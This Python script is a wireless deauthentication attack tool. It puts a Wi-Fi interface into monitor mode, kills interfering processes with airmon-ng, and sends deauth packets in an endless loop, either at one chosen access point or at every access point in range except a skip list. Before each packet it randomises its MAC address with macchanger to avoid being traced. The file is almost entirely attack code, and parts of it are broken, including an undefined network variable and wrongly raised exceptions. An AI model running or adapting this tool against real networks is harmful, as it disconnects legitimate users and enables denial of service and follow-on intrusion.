import subprocess
from wifi_utils import *
import sys


def prepare_attack(iface):
	monitor_mode(iface)
	kill_processes()


def send_AP_deauth(AP, network):
	pkt = AP.build_AP_deauth_pkt()
	print("Seding deauth packet to %s" % (AP.BSSID))
	sendp(pkt, iface=network.interface, verbose=False)


def deauth_AP(BSSID):
	interfaces = get_interfaces()
	iface = interfaces[0]  # we will use just one interface for now.
	iwlist_scan(iface)
	AP = network.get_AP(BSSID)
	set_channel(network, AP)
	prepare_attack(iface)
	while 1:
		mac_changer(network)
		send_AP_deauth(AP, network)


def deauth_all(skip):
	interfaces = get_interfaces()
	iface = interfaces[0]  # we will use just one interface for now.
	iwlist_scan(iface)
	prepare_attack(iface)
	while 1:
		for AP in network.APs:
			if AP.BSSID in skip:
				continue
			set_channel(network, AP)
			mac_changer(network)
			send_AP_deauth(AP, network)


def mac_changer(network):
	try:
		print("Changing MAC address on %s" %network.interface)
		subprocess.run(["ifconfig", network.interface, "down"], check=True, capture_output=True)
		subprocess.run(["macchanger", "-r", network.interface], check=True, capture_output=True)
		subprocess.run(["ifconfig", network.interface, "up"], check=True, capture_output=True)
	except:
		raise subprocess.CalledProcessError("Error changing MAC address.")


def kill_processes():
    try:
        print("Killing processes that might interfer ...")
        subprocess.run(["airmon-ng", "check", "kill"], check=True, capture_output=True)
    except subprocess.CalledProcessError:
        raise subprocess.CalledProcessError("Error killing processes.")


# deauth_AP("66:D1:54:56:02:34", "wlan0")

# managed_mode(["wlan0"])
# run_NetworkManeger()
